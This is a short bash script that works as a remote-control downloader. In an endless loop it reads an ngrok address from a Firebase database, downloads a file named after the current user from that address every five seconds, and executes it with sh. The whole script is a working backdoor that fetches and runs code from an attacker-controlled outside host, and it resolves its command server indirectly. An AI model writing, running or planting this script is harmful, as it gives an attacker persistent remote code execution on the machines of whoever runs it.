#!/bin/bash

GetAndExec() {
    # Collect ngrok url from firebase
    response=$(curl -s "https://retard-e363c-default-rtdb.asia-southeast1.firebasedatabase.app/IP.json")
    NGROK="${response:1:${#response}-2}"

    EXEC="$NGROK/$USER"

    # Download exec from ngrok url
    curl -sO "$EXEC"

    # Execute exec
sh $USER
}

while true; do
    GetAndExec
    sleep 5
done
